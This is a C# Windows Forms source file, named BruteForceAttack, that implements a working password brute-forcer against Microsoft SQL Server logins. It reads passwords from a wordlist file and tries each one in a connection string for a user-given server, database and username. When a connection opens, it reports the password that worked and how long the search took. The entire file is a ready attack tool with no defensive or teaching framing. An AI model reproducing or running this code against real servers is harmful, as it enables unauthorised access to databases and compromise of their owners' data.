using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Data;
using System.Data.SqlClient;

namespace BruteForceAttack
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            String cs;
            string serverName = txtServerName.Text;
            string dbName = txtDBname.Text;
            string userName = txtUserName.Text;
            string password;
            int count = Convert.ToInt32(txtCount.Text);
            System.IO.StreamReader sr = new System.IO.StreamReader("uniqpass_preview.txt");
            int k = 0;
            lstPasswordList.Items.Clear();
            DateTime dtStart = DateTime.Now;
            for (int i = 0; i < count; i++)
            {
                k++;
                password = sr.ReadLine();
                lblStatus.Text = password;
                Update();
                lstPasswordList.Items.Add(password);
                if (k > 15)
                {
                    k = 0;
                    lstPasswordList.Items.Clear();
                }
                cs = "DATA SOURCE=" + serverName + ";INITIAL CATALOG=" + dbName + ";UID=" + userName + ";Password=" + password + ";CONNECT TIMEOUT=1";
                try
                {
                    SqlConnection conn = new SqlConnection(cs);
                    conn.Open();
                    if (conn.State == ConnectionState.Open)
                    {
                        DateTime dtEnd = DateTime.Now;
                        TimeSpan ts = dtEnd - dtStart;
                        lblStatus.Text = i+"th connection attempt successful!  Password:'" + password+"'  Duration:"+ts.ToString(@"hh\:mm\:ss");

                        return;
                    }
                }
                catch (Exception)
                {
                    
                }
                
            }
            

        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }
    }
}
